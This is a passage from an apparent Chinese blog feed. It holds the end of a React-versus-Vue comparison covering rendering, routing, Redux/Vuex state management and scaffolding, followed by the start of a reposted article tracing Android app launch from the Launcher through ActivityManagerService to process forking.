src="https://upload-images.jianshu.io/upload_images/15531792-a0ab7632a6daee38.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="再渲染性能"><a href="#再渲染性能" class="headerlink" title="再渲染性能"></a>再渲染性能</h2><h3 id="React-5"><a href="#React-5" class="headerlink" title="React"></a>React</h3><p>在React里渲染机制是以组件单位更新的,也就是说当数据发生改变,当前视图包括其中的组件子组件和底下的子组件都会一起更新,这种违反性能的机制肯定是有问题的,所以React提供了生命周期shouldComponentUpdate方法让你决定当前组件是否更新,还有一个PureComponent方法会自动检测到state或者props发生变化时，才会调用render方法.但是只是浅比较,如果搭配ImmutableJs持久化数据据说性能大大的提升.除此之外还能节省大量的手动比较的代码和时间,</p><p>简单描述过程</p><ol><li>调用render函数利用JS生成虚拟Dom树,直到数据state/props发生改变的时候，render函数会被再次调用渲染出另外一棵虚拟Dom树;</li><li>比较前后两棵Dom树同层级的节点区别,非同层级节点包括所属子节点整个直接删除重新创建; <ul><li>不同的节点类型,直接替换.</li><li>相同节点类型当中的DOM节点,替换属性.</li><li>相同类型当中的组件节点,继续递归比较所属子节点.</li><li>DOM节点的递归children,继续递归比较children.</li><li>列表比较.赋予唯一的key作比较.</li></ul></li><li>更新视图中差异地方;</li></ol><h3 id="Vue-3"><a href="#Vue-3" class="headerlink" title="Vue"></a>Vue</h3><p>在 Vue 应用中，组件的依赖是在渲染过程中自动追踪的，所以系统能精确知晓哪个组件确实需要被重渲染,因为Vue是使用 Object.defineProperty对绑定属性进行数据劫持的,所以比起React组件式更新它能够精确接收到哪些组件才是需要渲染的.</p><ol><li>Vue 将遍历此data对象所有的属性，并使用 Object.defineProperty 把这些属性全部转为 getter/setter.</li><li>每个组件实例都有相应的 watcher 实例对象，它会在组件渲染的过程中把属性记录为依赖.</li><li>在属性被访问和修改时通知对应的组件.</li><li>对应的组件再次调动渲染函数，生成虚拟Dom树对比，实现更新.</li></ol><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><h3 id="React-Router"><a href="#React-Router" class="headerlink" title="React-Router"></a>React-Router</h3><p>这是React-Router3的模板写法,实际到了React-Router4的API和思想都有些大的差异</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import React from &#39;react&#39;</span><br><span class="line">import &#123; render &#125; from &#39;react-dom&#39;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 首先我们需要导入一些组件...</span><br><span class="line">import &#123; Router, Route, Link &#125; from &#39;react-router&#39;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 然后我们从应用中删除一堆代码和</span><br><span class="line">&#x2F;&#x2F; 增加一些 &lt;Link&gt; 元素...</span><br><span class="line">const App &#x3D; React.createClass(&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;h1&gt;App&lt;&#x2F;h1&gt;</span><br><span class="line">        &#123;&#x2F;* 把 &lt;a&gt; 变成 &lt;Link&gt; *&#x2F;&#125;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">          &lt;li&gt;&lt;Link to&#x3D;&quot;&#x2F;about&quot;&gt;About&lt;&#x2F;Link&gt;&lt;&#x2F;li&gt;</span><br><span class="line">          &lt;li&gt;&lt;Link to&#x3D;&quot;&#x2F;inbox&quot;&gt;Inbox&lt;&#x2F;Link&gt;&lt;&#x2F;li&gt;</span><br><span class="line">        &lt;&#x2F;ul&gt;</span><br><span class="line"></span><br><span class="line">        &#123;&#x2F;*</span><br><span class="line">          接著用 &#96;this.props.children&#96; 替换 &#96;&lt;Child&gt;&#96;</span><br><span class="line">          router 会帮我们找到这个 children</span><br><span class="line">        *&#x2F;&#125;</span><br><span class="line">        &#123;this.props.children&#125;</span><br><span class="line">      &lt;&#x2F;div&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 最后，我们用一些 &lt;Route&gt; 来渲染 &lt;Router&gt;。</span><br><span class="line">&#x2F;&#x2F; 这些就是路由提供的我们想要的东西。</span><br><span class="line">React.render((</span><br><span class="line">  &lt;Router&gt;</span><br><span class="line">    &lt;Route path&#x3D;&quot;&#x2F;&quot; component&#x3D;&#123;App&#125;&gt;</span><br><span class="line">      &lt;Route path&#x3D;&quot;about&quot; component&#x3D;&#123;About&#125; &#x2F;&gt;</span><br><span class="line">      &lt;Route path&#x3D;&quot;inbox&quot; component&#x3D;&#123;Inbox&#125; &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;Route&gt;</span><br><span class="line">  &lt;&#x2F;Router&gt;</span><br><span class="line">), document.body)</span><br></pre></td></tr></table></figure><h3 id="Vue-Router"><a href="#Vue-Router" class="headerlink" title="Vue-Router"></a>Vue-Router</h3><p>Vue-Router3的模板写法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 0. 如果使用模块化机制编程，导入Vue和VueRouter，要调用 Vue.use(VueRouter)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 1. 定义（路由）组件。</span><br><span class="line">&#x2F;&#x2F; 可以从其他文件 import 进来</span><br><span class="line">const Foo &#x3D; &#123; template: &#39;&lt;div&gt;foo&lt;&#x2F;div&gt;&#39; &#125;</span><br><span class="line">const Bar &#x3D; &#123; template: &#39;&lt;div&gt;bar&lt;&#x2F;div&gt;&#39; &#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 2. 定义路由</span><br><span class="line">&#x2F;&#x2F; 每个路由应该映射一个组件。 其中&quot;component&quot; 可以是</span><br><span class="line">&#x2F;&#x2F; 通过 Vue.extend() 创建的组件构造器，</span><br><span class="line">&#x2F;&#x2F; 或者，只是一个组件配置对象。</span><br><span class="line">&#x2F;&#x2F; 我们晚点再讨论嵌套路由。</span><br><span class="line">const routes &#x3D; [</span><br><span class="line">  &#123; path: &#39;&#x2F;foo&#39;, component: Foo &#125;,</span><br><span class="line">  &#123; path: &#39;&#x2F;bar&#39;, component: Bar &#125;</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 3. 创建 router 实例，然后传 &#96;routes&#96; 配置</span><br><span class="line">&#x2F;&#x2F; 你还可以传别的配置参数, 不过先这么简单著吧。</span><br><span class="line">const router &#x3D; new VueRouter(&#123;</span><br><span class="line">  routes &#x2F;&#x2F; （缩写）相当于 routes: routes</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 4. 创建和挂载根实例。</span><br><span class="line">&#x2F;&#x2F; 记得要通过 router 配置参数注入路由，</span><br><span class="line">&#x2F;&#x2F; 从而让整个应用都有路由功能</span><br><span class="line">const app &#x3D; new Vue(&#123;</span><br><span class="line">  router</span><br><span class="line">&#125;).$mount(&#39;#app&#39;)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 现在，应用已经启动了！</span><br></pre></td></tr></table></figure><h2 id="状态管理"><a href="#状态管理" class="headerlink" title="状态管理"></a>状态管理</h2><p>状态管理库有很多种,我只是举出我用过的例子,并不是必须的.下面只会展示最基本的代码,想跑完整流程还得看文档.</p><h3 id="Redux"><a href="#Redux" class="headerlink" title="Redux"></a>Redux</h3><p>Redux 可以用这三个基本原则来描述：</p><ul><li>单一数据源: 整个应用的 state 被储存在一棵 object tree 中，并且这个 object tree 只存在于唯一一个 store 中。</li><li>State 是只读的: 唯一改变 state 的方法就是触发 action，action 是一个用于描述已发生事件的普通对象。</li><li>使用纯函数来执行修改: 为了描述 action 如何改变 state tree ，你需要编写 reducers。</li></ul><p>Actions: 把数据从应用传到store的有效载荷。它是store数据的唯一来源.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * action 类型</span><br><span class="line"> *&#x2F;</span><br><span class="line">export const ADD_TODO &#x3D; &#39;ADD_TODO&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;*</span><br><span class="line"> * action 创建函数</span><br><span class="line"> *&#x2F;</span><br><span class="line">export function addTodo(text) &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">        type: ADD_TODO,</span><br><span class="line">        text</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Reducers: 指定了应用状态的变化如何响应actions并发送到store的，记住actions只是描述了有事情发生了这一事实，并没有描述应用如何更新state。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import &#123;</span><br><span class="line">    combineReducers</span><br><span class="line">&#125; from &#39;redux&#39;</span><br><span class="line">import &#123;</span><br><span class="line">    ADD_TODO,</span><br><span class="line">&#125; from &#39;.&#x2F;actions&#39;</span><br><span class="line"></span><br><span class="line">function todos(state &#x3D; [], action) &#123;</span><br><span class="line">    switch (action.type) &#123;</span><br><span class="line">        case ADD_TODO:</span><br><span class="line">            return [</span><br><span class="line">                ...state,</span><br><span class="line">                &#123;</span><br><span class="line">                    text: action.text,</span><br><span class="line">                    completed: false</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        default:</span><br><span class="line">            return state</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const todoApp &#x3D; combineReducers(&#123;</span><br><span class="line">    todos</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">export default todoApp</span><br></pre></td></tr></table></figure><p>Store: 就是把Actions和Reducers联系到一起的对象.</p><ul><li>维持应用的 state；</li><li>提供 getState() 方法获取 state；</li><li>提供 dispatch(action) 方法更新 state；</li><li>通过 subscribe(listener) 注册监听器;</li><li>通过 subscribe(listener) 返回的函数注销监听器。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import &#123; createStore &#125; from &#39;redux&#39;</span><br><span class="line">import todoApp from &#39;.&#x2F;reducers&#39;</span><br><span class="line">let store &#x3D; createStore(todoApp)</span><br></pre></td></tr></table></figure>单向数据流<br><img src="https://upload-images.jianshu.io/upload_images/15531792-19b88b12049ea29d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li></ul><ol><li>定义Action描述对象;</li><li>通过dispatcher触发Action对象;</li><li>Reducer响应变化更新到Store状态管理对象;</li><li>注入Store状态的组件视图更新;</li><li>界面交互触发Action再次跑相应流程;</li></ol><p>进阶:</p><ol><li>Action利用中间件发起异步请求;</li><li>Reducer逻辑拆分;</li><li>组件注入部分Store状态;<br>等等,<a href="https://link.segmentfault.com/?url=https://www.redux.org.cn/">Redux 中文文档</a>,(更多内容请自行查阅,本节到此为止了.)</li></ol><h3 id="Mobx"><a href="#Mobx" class="headerlink" title="Mobx"></a>Mobx</h3><p>另一种实现方式,具体可看<a href="https://segmentfault.com/a/1190000019991169">Mobx4.X状态管理入门</a></p><h3 id="Vuex"><a href="#Vuex" class="headerlink" title="Vuex"></a>Vuex</h3><p>Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。Vuex 也集成到 Vue 的官方调试工具 devtools extension，提供了诸如零配置的 time-travel 调试、状态快照导入导出等高级调试功能。</p><p>Mutation: 必须是同步函数,更改Vuex的store中的状态的唯一方法是提交mutatio</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; mutation-types.js</span><br><span class="line">export const SOME_MUTATION &#x3D; &#39;SOME_MUTATION&#39;</span><br><span class="line">&#x2F;&#x2F; store.js</span><br><span class="line">import Vuex from &#39;vuex&#39;</span><br><span class="line">import &#123;</span><br><span class="line">    SOME_MUTATION</span><br><span class="line">&#125; from &#39;.&#x2F;mutation-types&#39;</span><br><span class="line"></span><br><span class="line">const store &#x3D; new Vuex.Store(&#123;</span><br><span class="line">    state: &#123; ...</span><br><span class="line">    &#125;,</span><br><span class="line">    mutations: &#123;</span><br><span class="line">        &#x2F;&#x2F; 我们可以使用 ES2015 风格的计算属性命名功能来使用一个常量作为函数名</span><br><span class="line">        [SOME_MUTATION](state) &#123;</span><br><span class="line">            &#x2F;&#x2F; mutate state</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>Action 类似于mutation，不同在于：</p><ul><li>Action 提交的是 mutation，而不是直接变更状态;</li><li>Action 可以包含任意异步操作;</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">actions: &#123;</span><br><span class="line">  incrementAsync (&#123; commit &#125;) &#123;</span><br><span class="line">    setTimeout(() &#x3D;&gt; &#123;</span><br><span class="line">      commit(&#39;increment&#39;)</span><br><span class="line">    &#125;, 1000)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Getter: 从store中的state中派生出一些状态</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">getters: &#123;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">  doneTodosCount: (state, getters) &#x3D;&gt; &#123;</span><br><span class="line">    return getters.doneTodos.length</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>State: 包含了全部的应用层级状态。至此它便作为一个“唯一数据源 (SSOT)”而存在.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const app &#x3D; new Vue(&#123;</span><br><span class="line">  el: &#39;#app&#39;,</span><br><span class="line">  &#x2F;&#x2F; 把 store 对象提供给 “store” 选项，这可以把 store 的实例注入所有的子组件</span><br><span class="line">  store,</span><br><span class="line">  components: &#123; Counter &#125;,</span><br><span class="line">  template: &#96;</span><br><span class="line">    &lt;div class&#x3D;&quot;app&quot;&gt;</span><br><span class="line">      &lt;counter&gt;&lt;&#x2F;counter&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">  &#96;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>Module: Vuex 允许我们将 store 分割成模块（module）。每个模块拥有自己的 state、mutation、action、getter、甚至是嵌套子模块——从上至下进行同样方式的分割：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">const moduleA &#x3D; &#123;</span><br><span class="line">  state: &#123; ... &#125;,</span><br><span class="line">  mutations: &#123; ... &#125;,</span><br><span class="line">  actions: &#123; ... &#125;,</span><br><span class="line">  getters: &#123; ... &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const moduleB &#x3D; &#123;</span><br><span class="line">  state: &#123; ... &#125;,</span><br><span class="line">  mutations: &#123; ... &#125;,</span><br><span class="line">  actions: &#123; ... &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const store &#x3D; new Vuex.Store(&#123;</span><br><span class="line">  modules: &#123;</span><br><span class="line">    a: moduleA,</span><br><span class="line">    b: moduleB</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">store.state.a &#x2F;&#x2F; -&gt; moduleA 的状态</span><br><span class="line">store.state.b &#x2F;&#x2F; -&gt; moduleB 的状态</span><br></pre></td></tr></table></figure><p>单向数据流<br><img src="https://upload-images.jianshu.io/upload_images/15531792-40744a96a1b8ad4b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>(官网来的)<br><a href="https://link.segmentfault.com/?url=https://vuex.vuejs.org/zh-cn/">Vuex</a></p><h3 id="对比-3"><a href="#对比-3" class="headerlink" title="对比"></a>对比</h3><ul><li><p>Redux的Action可以是异步或者同步函数返回Javascript对象,Vuex分为同步函数不限制格式的mutation和可包含异步函数的action</p></li><li><p>React直接dispatch action触发状态更新,Vuex是dispatch action提交mutation再commmit触发状态更新</p></li><li><p>Redux指定了应用状态的变化如何响应actions并发送到store的reducer,且必须为纯函数.Vuex实际上是使用mutation更新状态</p><p>  – Redux: (dispatch)action -&gt; (reducer)store<br>  – Vuex: (dispatch)action -&gt; (commit)mutation -&gt; (mutate)store</p></li><li><p>Vuex可以用getter派生出一些状态,就像计算函数会被缓存起来只有依赖变化之后才会重新计算.<br>(更多内容请自行查阅,本节到此为止了.)</p></li></ul><h2 id="官方脚手架"><a href="#官方脚手架" class="headerlink" title="官方脚手架"></a>官方脚手架</h2><p>React 官方提供了 create-react-app,诟病的地方比较多.</p><ul><li>它不允许在项目生成时进行任何配置，而 Vue 支持 Yeoman-like 定制。</li><li>它只提供一个构建单页面应用的单一模板，而 Vue 提供了各种用途的模板。</li><li>它不能用用户自建的模板构建项目，而自建模板对企业环境下预先建立协议是特别有用的。</li></ul><p>更多人选择自己搭建或者使用民间打包库.</p><p>Vue 提供了 Vue-cli 脚手架，能让你非常容易地构建项目，包含了 Webpack，Browserify，甚至 no build system,但是有些设置例如Scss预处理器等自定义配置需要自己搞,总的来说相当实用.</p><h2 id="入门难度"><a href="#入门难度" class="headerlink" title="入门难度"></a>入门难度</h2><p>React正常来说需要搭配Jsx和Es6语法和构建环境;<br>Vue可以直接引入js库就能开发,而且内置的功能属性比React多得多</p>]]></content>
      
      
      
        <tags>
            
            <tag> Reacr &amp; JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 从点击应用图标到界面显示的过程</title>
      <link href="/2021/08/22/Android-%E4%BB%8E%E7%82%B9%E5%87%BB%E5%BA%94%E7%94%A8%E5%9B%BE%E6%A0%87%E5%88%B0%E7%95%8C%E9%9D%A2%E6%98%BE%E7%A4%BA%E7%9A%84%E8%BF%87%E7%A8%8B/"/>
      <url>/2021/08/22/Android-%E4%BB%8E%E7%82%B9%E5%87%BB%E5%BA%94%E7%94%A8%E5%9B%BE%E6%A0%87%E5%88%B0%E7%95%8C%E9%9D%A2%E6%98%BE%E7%A4%BA%E7%9A%84%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://blog.csdn.net/freekiteyu/article/details/79318031">一篇文章看明白 Android 从点击应用图标到界面显示的过程</a> (遵循CC 4.0 BY-SA版权协议)</p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>从点击桌面应用图标到应用显示的过程我们再熟悉不过了，下面我们来分析下这个过程都做了什么。</p><p>本文主要对以下问题分析：</p><ul><li>ActivityThread 是什么，它是一个线程吗，如何被启动的？</li><li>ActivityClientRecord 与 ActivityRecord 是什么？</li><li>Context 是什么，ContextImpl，ContextWapper 是什么？</li><li>Instrumentation 是什么？</li><li>Application 是什么，什么时候创建的，每个应用程序有几个 Application？</li><li>点击 Launcher 启动 Activity 和应用内部启动 Activity 的区别？</li><li>Activity 启动过程，onCreate()，onResume() 回调时机及具体作用？</li></ul><h1 id="Launcher"><a href="#Launcher" class="headerlink" title="Launcher"></a>Launcher</h1><p>如不了解 Android 是如何从开机到 Launcher 启动的过程，请先阅读<a href="https://github.com/jeanboydev/Android-ReadTheFuckingSourceCode/blob/master/android/Android-%E7%B3%BB%E7%BB%9F%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B.md">Android - 系统启动过程</a><br><img src="https://upload-images.jianshu.io/upload_images/15531792-f1a9beeee07a5cce.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>我们知道 Android 系统启动后已经启动了 Zygote，ServiceManager，SystemServer 等系统进程；ServiceManager 进程中完成了 Binder 初始化；SystemServer 进程中 ActivityManagerService，WindowManagerService，PackageManagerService 等系统服务在 ServiceManager 中已经注册；最后启动了 Launcher 桌面应用。</p><p>其实 Launcher 本身就是一个应用程序，运行在自己的进程中，我们看到的桌面就是 Launcher 中的一个 Activity。</p><p>应用安装的时候，通过 PackageManagerService 解析 apk 的 AndroidManifest.xml 文件，提取出这个 apk 的信息写入到 packages.xml 文件中，这些信息包括：权限、应用包名、icon、apk 的安装位置、版本、userID 等等。packages.xml 文件位于系统目录下/data/system/packages.xml。</p><p>同时桌面 Launcher 会为安装过的应用生成不同的应用入口，对应桌面上的应用图标，下面分析点击应用图标的到应用启动的过程。</p><h1 id="点击-Launcher-中应用图标"><a href="#点击-Launcher-中应用图标" class="headerlink" title="点击 Launcher 中应用图标"></a>点击 Launcher 中应用图标</h1><p><img src="https://upload-images.jianshu.io/upload_images/15531792-b9fa713c0e4ab023.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>点击 Launcher 中应用图标将会执行以下方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Launcher.startActivitySafely()</span><br><span class="line">Launcher.startActivity()</span><br><span class="line">&#x2F;&#x2F;以上两个方法主要是检查将要打开的 Activity 是否存在</span><br><span class="line"></span><br><span class="line">Activity.startActivity()</span><br><span class="line">&#x2F;&#x2F;这段代码大家已经很熟悉，经常打开 Activity 用的就是这个方法</span><br><span class="line"></span><br><span class="line">Activity.startActivityForResult()</span><br><span class="line">&#x2F;&#x2F;默认 requestCode &#x3D; -1，也可通过调用 startActivityForResult() 传入 requestCode。 </span><br><span class="line">&#x2F;&#x2F;然后通过 MainThread 获取到 ApplicationThread 传入下面方法。</span><br><span class="line"></span><br><span class="line">Instrumentation.execStartActivity()</span><br><span class="line">&#x2F;&#x2F;通过 ActivityManagerNative.getDefault() 获取到 ActivityManagerService 的代理为进程通讯作准备。</span><br><span class="line"></span><br><span class="line">ActivityManagerNative.getDefault().startActivity()</span><br><span class="line">ActivityManagerProxy.startActivity()</span><br><span class="line">&#x2F;&#x2F;调用代理对象的 startActivity() 方法，发送 START_ACTIVITY_TRANSACTION 命令。</span><br></pre></td></tr></table></figure><p>在 system_server 进程中的服务端 ActivityManagerService 收到 START_ACTIVITY_TRANSACTION 命令后进行处理，调用 startActivity() 方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ActivityManagerService.startActivity() -&gt; startActivityAsUser(intent, requestCode, userId)</span><br><span class="line">&#x2F;&#x2F;通过 UserHandle.getCallingUserId() 获取到 userId 并调用 startActivityAsUser() 方法。</span><br><span class="line"></span><br><span class="line">ActivityStackSupervisor.startActivityMayWait() -&gt; resolveActivity()</span><br><span class="line">&#x2F;&#x2F;通过 intent 创建新的 intent 对象，即使之前 intent 被修改也不受影响。 然后调用 resolveActivity()。</span><br><span class="line">&#x2F;&#x2F;然后通过层层调用获取到 ApplicationPackageManager 对象。</span><br><span class="line"></span><br><span class="line">PackageManagerService.resolveIntent() -&gt; queryIntentActivities()</span><br><span class="line">&#x2F;&#x2F;获取 intent 所指向的 Activity 信息，并保存到 Intent 对象。</span><br><span class="line"></span><br><span class="line">PackageManagerService.chooseBestActivity()</span><br><span class="line">&#x2F;&#x2F;当存在多个满足条件的 Activity 则会弹框让用户来选择。</span><br><span class="line"></span><br><span class="line">ActivityStackSupervisor.startActivityLocked()</span><br><span class="line">&#x2F;&#x2F;获取到调用者的进程信息。 通过 Intent.FLAG_ACTIVITY_FORWARD_RESULT 判断是否需要进行 startActivityForResult 处理。 </span><br><span class="line">&#x2F;&#x2F;检查调用者是否有权限来调用指定的 Activity。 </span><br><span class="line">&#x2F;&#x2F;创建 ActivityRecord 对象，并检查是否运行 App 切换。</span><br><span class="line"></span><br><span class="line">ActivityStackSupervisor.startActivityUncheckedLocked() -&gt; startActivityLocked()</span><br><span class="line">&#x2F;&#x2F;进行对 launchMode 的处理[可参考 Activity 启动模式]，创建 Task 等操作。</span><br><span class="line">&#x2F;&#x2F;启动 Activity 所在进程，已存在则直接 onResume()，不存在则创建 Activity 并处理是否触发 onNewIntent()。</span><br><span class="line"></span><br><span class="line">ActivityStack.resumeTopActivityInnerLocked()</span><br><span class="line">&#x2F;&#x2F;找到 resume 状态的 Activity，执行 startPausingLocked() 暂停该 Activity，同时暂停所有处于后台栈的 Activity，找不到 resume 状态的 Activity 则回桌面。</span><br><span class="line">&#x2F;&#x2F;如果需要启动的 Activity 进程已存在，直接设置 Activity 状态为 resumed。 调用下面方法。</span><br><span class="line"></span><br><span class="line">ActivityStackSupervisor.startSpecificActivityLocked()</span><br><span class="line">&#x2F;&#x2F;进程存在调用 realStartActivityLocked() 启动 Activity，进程不存在则调用下面方法。</span><br></pre></td></tr></table></figure><h1 id="fork-新进程"><a href="#fork-新进程" class="headerlink" title="fork 新进程"></a>fork 新进程</h1><p>从 Launcher 点击图标，如果应用没有启动过，则会 fork 一个新进程。创建新进程的时候，ActivityManagerService 会保存一个 ProcessRecord 信息，Activity 应用程序中的AndroidManifest.xml 配置文件中，我们没有指定 Application 标签的 process 属性，系统就会默认使用 package 的名称。每一个应用程序都有自己的 uid，因此，这里 uid + process 